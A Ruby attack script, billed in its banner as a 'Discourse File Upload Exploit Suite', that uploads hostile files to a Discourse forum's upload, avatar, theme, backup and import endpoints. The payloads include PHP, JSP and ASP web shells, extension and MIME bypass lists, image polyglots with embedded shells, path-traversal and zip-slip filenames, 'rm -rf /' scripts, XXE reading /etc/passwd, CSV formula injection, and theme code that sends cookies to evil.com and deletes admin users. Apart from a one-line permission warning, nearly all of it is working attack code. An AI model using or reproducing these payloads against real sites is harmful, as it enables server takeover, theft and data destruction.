#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'base64'
require 'tempfile'
require 'zip'
require 'digest'

class DiscourseFileUpload
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @proxy = options[:proxy]
    @timeout = options[:timeout] || 10
    @session = {}
    @csrf_token = nil
    
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0
      },
      target: @target_url,
      timestamp: Time.now.iso8601
    }
    
    extract_csrf_token
  end
  
  def run_all_tests
    puts "\nüîç Starting file upload vulnerability tests on #{@target_url}"
    puts "=" * 60
    
    # Basic file upload tests
    test_unrestricted_file_upload
    test_extension_bypass
    test_mime_type_bypass
    test_content_type_spoofing
    
    # Malicious file uploads
    test_executable_upload
    test_script_upload
    test_archive_upload
    test_image_polyglot_upload
    
    # Path traversal
    test_path_traversal_upload
    
    # Size and content validation
    test_file_size_bypass
    test_content_validation_bypass
    
    # Avatar and theme uploads
    test_avatar_upload_bypass
    test_theme_upload_bypass
    
    # Backup and import uploads
    test_backup_upload_bypass
    test_import_upload_bypass
    
    print_results
    save_results
    
    @results
  end
  
  def test_unrestricted_file_upload
    puts "\n[*] Testing unrestricted file upload..."
    @results[:summary][:total_tests] += 1
    
    # Test various file types
    file_tests = [
      { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
      { name: 'shell.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', type: 'application/x-jsp' },
      { name: 'shell.asp', content: '<% eval request("cmd") %>', type: 'application/x-asp' },
      { name: 'shell.aspx', content: '<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start(Request["cmd"]));%>', type: 'application/x-aspx' },
      { name: 'shell.py', content: 'import os; os.system(input())', type: 'text/x-python' },
      { name: 'shell.rb', content: 'system(ARGV[0])', type: 'application/x-ruby' },
      { name: 'shell.pl', content: 'system($ARGV[0]);', type: 'application/x-perl' },
      { name: 'config.conf', content: 'admin_password=hacked', type: 'text/plain' },
      { name: '.htaccess', content: 'AddType application/x-httpd-php .txt', type: 'text/plain' },
      { name: 'web.config', content: '<?xml version="1.0"?><configuration><system.web><httpHandlers><add verb="*" path="*.txt" type="System.Web.UI.PageHandlerFactory"/></httpHandlers></system.web></configuration>', type: 'text/xml' }
    ]
    
    upload_endpoints = [
      '/uploads.json',
      '/uploads',
      '/admin/backups/upload',
      '/admin/themes/import'
    ]
    
    upload_endpoints.each do |endpoint|
      file_tests.each do |file_test|
        test_file_upload(endpoint, file_test[:name], file_test[:content], file_test[:type], 'Unrestricted Upload')
      end
    end
  end
  
  def test_extension_bypass
    puts "\n[*] Testing file extension bypass techniques..."
    @results[:summary][:total_tests] += 1
    
    base_content = '<?php system($_GET["cmd"]); ?>'
    
    # Extension bypass techniques
    bypass_extensions = [
      'shell.php.txt',
      'shell.php.jpg',
      'shell.php.png',
      'shell.php.gif',
      'shell.php.pdf',
      'shell.txt.php',
      'shell.jpg.php',
      'shell.php.',
      'shell.php%00.jpg',
      'shell.php\x00.jpg',
      'shell.php%20',
      'shell.php%0a',
      'shell.php%0d',
      'shell.PHP',
      'shell.Php',
      'shell.pHP',
      'shell.php5',
      'shell.php4',
      'shell.php3',
      'shell.phtml',
      'shell.phps',
      'shell.pht',
      'shell.phpt'
    ]
    
    bypass_extensions.each do |filename|
      test_file_upload('/uploads.json', filename, base_content, 'application/x-php', 'Extension Bypass')
    end
  end
  
  def test_mime_type_bypass
    puts "\n[*] Testing MIME type bypass techniques..."
    @results[:summary][:total_tests] += 1
    
    php_content = '<?php system($_GET["cmd"]); ?>'
    
    # MIME type bypass techniques
    mime_types = [
      'image/jpeg',
      'image/png',
      'image/gif',
      'text/plain',
      'application/octet-stream',
      'multipart/form-data',
      'application/x-www-form-urlencoded',
      'text/html',
      'application/json',
      'text/xml',
      'application/xml'
    ]
    
    mime_types.each do |mime_type|
      test_file_upload('/uploads.json', 'shell.php', php_content, mime_type, 'MIME Type Bypass')
    end
  end
  
  def test_content_type_spoofing
    puts "\n[*] Testing Content-Type spoofing..."
    @results[:summary][:total_tests] += 1
    
    # Create files with spoofed content types
    spoofed_files = [
      { name: 'image.jpg', content: create_php_jpg_polyglot, type: 'image/jpeg' },
      { name: 'image.png', content: create_php_png_polyglot, type: 'image/png' },
      { name: 'image.gif', content: create_php_gif_polyglot, type: 'image/gif' },
      { name: 'document.pdf', content: create_php_pdf_polyglot, type: 'application/pdf' }
    ]
    
    spoofed_files.each do |file|
      test_file_upload('/uploads.json', file[:name], file[:content], file[:type], 'Content-Type Spoofing')
    end
  end
  
  def test_executable_upload
    puts "\n[*] Testing executable file upload..."
    @results[:summary][:total_tests] += 1
    
    # Test executable files
    executables = [
      { name: 'malware.exe', content: create_fake_exe, type: 'application/x-msdownload' },
      { name: 'script.bat', content: '@echo off\necho Malicious batch file', type: 'application/x-bat' },
      { name: 'script.sh', content: '#!/bin/bash\necho "Malicious shell script"', type: 'application/x-sh' },
      { name: 'script.ps1', content: 'Write-Host "Malicious PowerShell"', type: 'application/x-powershell' },
      { name: 'library.dll', content: create_fake_dll, type: 'application/x-msdownload' },
      { name: 'binary', content: create_fake_binary, type: 'application/octet-stream' }
    ]
    
    executables.each do |exe|
      test_file_upload('/uploads.json', exe[:name], exe[:content], exe[:type], 'Executable Upload')
    end
  end
  
  def test_script_upload
    puts "\n[*] Testing script file upload..."
    @results[:summary][:total_tests] += 1
    
    # Test various script types
    scripts = [
      { name: 'malicious.js', content: 'alert("XSS"); fetch("/admin/users", {method: "DELETE"});', type: 'application/javascript' },
      { name: 'malicious.vbs', content: 'MsgBox "Malicious VBScript"', type: 'application/x-vbscript' },
      { name: 'malicious.py', content: 'import os; os.system("rm -rf /")', type: 'text/x-python' },
      { name: 'malicious.rb', content: 'system("rm -rf /")', type: 'application/x-ruby' },
      { name: 'malicious.pl', content: 'system("rm -rf /");', type: 'application/x-perl' }
    ]
    
    scripts.each do |script|
      test_file_upload('/uploads.json', script[:name], script[:content], script[:type], 'Script Upload')
    end
  end
  
  def test_archive_upload
    puts "\n[*] Testing malicious archive upload..."
    @results[:summary][:total_tests] += 1
    
    # Create malicious ZIP file
    zip_content = create_malicious_zip
    test_file_upload('/admin/themes/import', 'malicious.zip', zip_content, 'application/zip', 'Malicious Archive')
    
    # Create malicious TAR file
    tar_content = create_malicious_tar
    test_file_upload('/admin/backups/upload', 'malicious.tar.gz', tar_content, 'application/gzip', 'Malicious Archive')
  end
  
  def test_image_polyglot_upload
    puts "\n[*] Testing image polyglot upload..."
    @results[:summary][:total_tests] += 1
    
    # Test polyglot files (valid images with embedded code)
    polyglots = [
      { name: 'polyglot.jpg', content: create_jpg_php_polyglot, type: 'image/jpeg' },
      { name: 'polyglot.png', content: create_png_php_polyglot, type: 'image/png' },
      { name: 'polyglot.gif', content: create_gif_php_polyglot, type: 'image/gif' },
      { name: 'polyglot.svg', content: create_svg_xss_polyglot, type: 'image/svg+xml' }
    ]
    
    polyglots.each do |polyglot|
      test_file_upload('/uploads.json', polyglot[:name], polyglot[:content], polyglot[:type], 'Image Polyglot')
    end
  end
  
  def test_path_traversal_upload
    puts "\n[*] Testing path traversal in file upload..."
    @results[:summary][:total_tests] += 1
    
    malicious_content = '<?php system($_GET["cmd"]); ?>'
    
    # Path traversal filenames
    traversal_names = [
      '../shell.php',
      '..\\shell.php',
      '../../shell.php',
      '..\\..\\shell.php',
      '../../../var/www/shell.php',
      '..\\..\\..\\inetpub\\wwwroot\\shell.php',
      '%2e%2e%2fshell.php',
      '%2e%2e%5cshell.php',
      '..%2fshell.php',
      '..%5cshell.php',
      '....//shell.php',
      '....\\\\shell.php',
      '..//shell.php',
      '..\\\\shell.php'
    ]
    
    traversal_names.each do |filename|
      test_file_upload('/uploads.json', filename, malicious_content, 'application/x-php', 'Path Traversal')
    end
  end
  
  def test_file_size_bypass
    puts "\n[*] Testing file size limit bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test with very large files
    large_content = 'A' * (10 * 1024 * 1024)  # 10MB
    test_file_upload('/uploads.json', 'large.txt', large_content, 'text/plain', 'Size Limit Bypass')
    
    # Test with zero-byte file
    test_file_upload('/uploads.json', 'empty.txt', '', 'text/plain', 'Zero-byte File')
  end
  
  def test_content_validation_bypass
    puts "\n[*] Testing content validation bypass..."
    @results[:summary][:total_tests] += 1
    
    # Files with malicious content but safe extensions
    bypass_files = [
      { name: 'innocent.txt', content: '<?php system($_GET["cmd"]); ?>', type: 'text/plain' },
      { name: 'config.json', content: '{"admin_password": "hacked"}', type: 'application/json' },
      { name: 'data.xml', content: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', type: 'text/xml' },
      { name: 'style.css', content: 'body { background: url("javascript:alert(1)"); }', type: 'text/css' }
    ]
    
    bypass_files.each do |file|
      test_file_upload('/uploads.json', file[:name], file[:content], file[:type], 'Content Validation Bypass')
    end
  end
  
  def test_avatar_upload_bypass
    puts "\n[*] Testing avatar upload bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test avatar-specific bypasses
    avatar_files = [
      { name: 'avatar.php.jpg', content: create_php_jpg_polyglot, type: 'image/jpeg' },
      { name: 'avatar.svg', content: create_svg_xss_polyglot, type: 'image/svg+xml' },
      { name: 'avatar.gif', content: create_gif_php_polyglot, type: 'image/gif' }
    ]
    
    avatar_files.each do |file|
      test_file_upload('/u/admin/preferences/avatar/pick', file[:name], file[:content], file[:type], 'Avatar Upload Bypass')
    end
  end
  
  def test_theme_upload_bypass
    puts "\n[*] Testing theme upload bypass..."
    @results[:summary][:total_tests] += 1
    
    # Create malicious theme ZIP
    theme_zip = create_malicious_theme_zip
    test_file_upload('/admin/themes/import', 'malicious_theme.zip', theme_zip, 'application/zip', 'Theme Upload Bypass')
  end
  
  def test_backup_upload_bypass
    puts "\n[*] Testing backup upload bypass..."
    @results[:summary][:total_tests] += 1
    
    # Create malicious backup file
    backup_content = create_malicious_backup
    test_file_upload('/admin/backups/upload', 'malicious.tar.gz', backup_content, 'application/gzip', 'Backup Upload Bypass')
  end
  
  def test_import_upload_bypass
    puts "\n[*] Testing import upload bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test various import file types
    import_files = [
      { name: 'users.csv', content: create_malicious_csv, type: 'text/csv' },
      { name: 'data.json', content: create_malicious_json, type: 'application/json' },
      { name: 'export.xml', content: create_malicious_xml, type: 'text/xml' }
    ]
    
    import_files.each do |file|
      test_file_upload('/admin/users/list/export', file[:name], file[:content], file[:type], 'Import Upload Bypass')
    end
  end
  
  def test_file_upload(endpoint, filename, content, content_type, test_type)
    puts "  Testing #{filename} upload to #{endpoint}"
    
    response = upload_file(endpoint, filename, content, content_type)
    
    if response && check_upload_success(response, filename, content)
      severity = determine_upload_severity(filename, content, endpoint)
      
      add_vulnerability({
        test_type: test_type,
        endpoint: endpoint,
        filename: filename,
        content_type: content_type,
        severity: severity,
        evidence: extract_upload_evidence(response, filename),
        description: "#{test_type} vulnerability allows uploading #{filename}"
      })
    end
  end
  
  def upload_file(endpoint, filename, content, content_type)
    uri = URI("#{@target_url}#{endpoint}")
    
    boundary = "----WebKitFormBoundary#{rand(1000000000)}"
    
    # Create multipart form data
    body = "--#{boundary}\r\n"
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"#{filename}\"\r\n"
    body += "Content-Type: #{content_type}\r\n\r\n"
    body += content
    body += "\r\n--#{boundary}--\r\n"
    
    headers = {
      'Content-Type' => "multipart/form-data; boundary=#{boundary}",
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    }
    
    make_request(uri, 'POST', body, headers)
  end
  
  def check_upload_success(response, filename, content)
    return false unless response
    
    # Check for successful upload indicators
    success_indicators = [
      'upload_id',
      'url',
      'success',
      'uploaded',
      'file_id',
      'attachment_id'
    ]
    
    response_text = response.body.to_s.downcase
    
    # Check response code
    if response.code.to_i >= 200 && response.code.to_i < 300
      # Check for success indicators in response
      success_indicators.each do |indicator|
        return true if response_text.include?(indicator)
      end
      
      # If response is JSON and contains file info
      begin
        json_response = JSON.parse(response.body)
        return true if json_response.is_a?(Hash) && (json_response['url'] || json_response['id'])
      rescue JSON::ParserError
        # Not JSON, continue
      end
    end
    
    false
  end
  
  def determine_upload_severity(filename, content, endpoint)
    # Critical: Executable files or admin endpoints
    if filename.match(/\.(php|jsp|asp|aspx|exe|dll|sh|bat|ps1)$/i) || endpoint.include?('/admin/')
      return 'Critical'
    end
    
    # High: Script files or polyglots
    if filename.match(/\.(js|vbs|py|rb|pl|svg)$/i) || content.include?('<?php') || content.include?('<script')
      return 'High'
    end
    
    # Medium: Other potentially dangerous files
    'Medium'
  end
  
  def extract_upload_evidence(response, filename)
    evidence = []
    
    evidence << "Response code: #{response.code}"
    evidence << "Filename: #{filename}"
    
    response_text = response.body.to_s
    
    # Extract upload URL if present
    if match = response_text.match(/"url"\s*:\s*"([^"]+)"/)
      evidence << "Upload URL: #{match[1]}"
    end
    
    # Extract upload ID if present
    if match = response_text.match(/"id"\s*:\s*(\d+)/)
      evidence << "Upload ID: #{match[1]}"
    end
    
    evidence << "Response length: #{response_text.length} bytes"
    
    evidence
  end
  
  # File creation helpers
  def create_php_jpg_polyglot
    # JPEG header + PHP code
    "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xFF\xFE\x00\x13<?php system($_GET['cmd']); ?>\xFF\xD9"
  end
  
  def create_php_png_polyglot
    # PNG header + PHP code
    "\x89PNG\r\n\x1A\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xDE\x00\x00\x00\x0CIDAT\x08\x1Dc\xF8\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00IEND\xAEB`\x82<?php system($_GET['cmd']); ?>"
  end
  
  def create_php_gif_polyglot
    # GIF header + PHP code
    "GIF89a\x01\x00\x01\x00\x00\x00\x00!\xF9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00;<?php system($_GET['cmd']); ?>"
  end
  
  def create_svg_xss_polyglot
    <<~SVG
      <?xml version="1.0" encoding="UTF-8"?>
      <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <script>alert('XSS in SVG')</script>
        <circle cx="50" cy="50" r="40" fill="red"/>
      </svg>
    SVG
  end
  
  def create_php_pdf_polyglot
    # PDF header + PHP code
    "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj 2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj 3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \ntrailer<</Size 4/Root 1 0 R>>\nstartxref\n174\n%%EOF\n<?php system($_GET['cmd']); ?>"
  end
  
  def create_fake_exe
    # Fake PE header
    "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" + "A" * 100
  end
  
  def create_fake_dll
    # Fake DLL header
    "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" + "B" * 100
  end
  
  def create_fake_binary
    # Random binary data
    "\x7FELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" + "C" * 100
  end
  
  def create_malicious_zip
    # Create a ZIP file with path traversal
    zip_data = ""
    
    # ZIP file structure with ../../../shell.php
    zip_data += "PK\x03\x04\x14\x00\x00\x00\x08\x00"
    zip_data += "\x00\x00\x00\x00"
    zip_data += "\x1A\x00\x00\x00"
    zip_data += "\x1A\x00\x00\x00"
    zip_data += "\x11\x00\x00\x00"
    zip_data += "../../../shell.php"
    zip_data += "<?php system($_GET['cmd']); ?>"
    
    zip_data
  end
  
  def create_malicious_tar
    # Simple TAR-like structure
    "\x1F\x8B\x08\x00\x00\x00\x00\x00\x00\xFF" + "malicious tar content" + "\x00" * 100
  end
  
  def create_malicious_theme_zip
    # Create ZIP with theme files containing malicious code
    zip_content = ""
    
    # Add theme.yml
    theme_yml = <<~YAML
      name: "Malicious Theme"
      about: "A theme with malicious code"
      version: "1.0"
      author: "Hacker"
    YAML
    
    # Add JavaScript with XSS
    theme_js = <<~JS
      alert('XSS in theme');
      fetch('/admin/users', {method: 'DELETE'});
    JS
    
    # Add CSS with data exfiltration
    theme_css = <<~CSS
      body {
        background: url('http://evil.com/steal?data=' + document.cookie);
      }
    CSS
    
    # Simple ZIP structure
    zip_content += "PK\x03\x04" + "\x00" * 26 + "theme.yml" + theme_yml
    zip_content += "PK\x03\x04" + "\x00" * 26 + "theme.js" + theme_js
    zip_content += "PK\x03\x04" + "\x00" * 26 + "theme.css" + theme_css
    
    zip_content
  end
  
  def create_malicious_backup
    # Fake backup with malicious content
    "\x1F\x8B\x08\x00\x00\x00\x00\x00\x00\xFF" + "malicious backup" + "\x00" * 50
  end
  
  def create_malicious_csv
    <<~CSV
      username,email,password
      admin,admin@evil.com,"=cmd|'/c calc'!A1"
      hacker,hacker@evil.com,"=HYPERLINK(\"http://evil.com\",\"click me\")"
    CSV
  end
  
  def create_malicious_json
    {
      "users": [
        {
          "username": "admin",
          "password": "hacked",
          "email": "admin@evil.com",
          "admin": true
        }
      ],
      "__proto__": {
        "isAdmin": true
      }
    }.to_json
  end
  
  def create_malicious_xml
    <<~XML
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE root [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        <!ENTITY xxe2 SYSTEM "http://evil.com/steal">
      ]>
      <root>
        <user>
          <username>&xxe;</username>
          <password>&xxe2;</password>
        </user>
      </root>
    XML
  end
  
  def create_jpg_php_polyglot
    create_php_jpg_polyglot
  end
  
  def create_png_php_polyglot
    create_php_png_polyglot
  end
  
  def create_gif_php_polyglot
    create_php_gif_polyglot
  end
  
  def extract_csrf_token
    begin
      response = make_request(URI("#{@target_url}/"), 'GET')
      if response && response.body
        # Extract CSRF token from meta tag
        if match = response.body.match(/name="csrf-token"\s+content="([^"]+)"/)
          @csrf_token = match[1]
        end
        
        # Extract session cookies
        if response['Set-Cookie']
          @session[:cookies] = response['Set-Cookie']
        end
      end
    rescue => e
      puts "[!] Failed to extract CSRF token: #{e.message}"
    end
  end
  
  def make_request(uri, method, body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    # Set proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    # Default headers
    default_headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'Connection' => 'keep-alive'
    }
    
    # Add session cookies
    if @session[:cookies]
      default_headers['Cookie'] = @session[:cookies]
    end
    
    headers = default_headers.merge(headers)
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri.request_uri, headers)
    when 'POST'
      req = Net::HTTP::Post.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'PUT'
      req = Net::HTTP::Put.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'DELETE'
      Net::HTTP::Delete.new(uri.request_uri, headers)
    end
    
    begin
      response = http.request(request)
      return response
    rescue => e
      puts "[!] Request failed: #{e.message}" if @verbose
      return nil
    end
  end
  
  def add_vulnerability(vuln_data)
    @results[:vulnerabilities] << vuln_data
    @results[:vulnerable] = true
    @results[:summary][:successful_tests] += 1
    
    case vuln_data[:severity]
    when 'Critical'
      @results[:summary][:critical_vulns] += 1
    when 'High'
      @results[:summary][:high_vulns] += 1
    when 'Medium'
      @results[:summary][:medium_vulns] += 1
    end
    
    puts "  ‚úì #{vuln_data[:severity]} upload vulnerability: #{vuln_data[:filename]}"
  end
  
  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE FILE UPLOAD TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Filename: #{vuln[:filename]}"
        puts "     Content-Type: #{vuln[:content_type]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end
  
  def save_results
    filename = 'discourse_file_upload_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse File Upload Exploit Suite\n\n"
    opts.banner += "Usage: ruby discourse_file_upload.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_file_upload.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscourseFileUpload.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\nüö® CRITICAL: File upload vulnerabilities found!"
      puts "   Malicious file upload and potential RCE possible!"
    else
      puts "\n‚úÖ No file upload vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end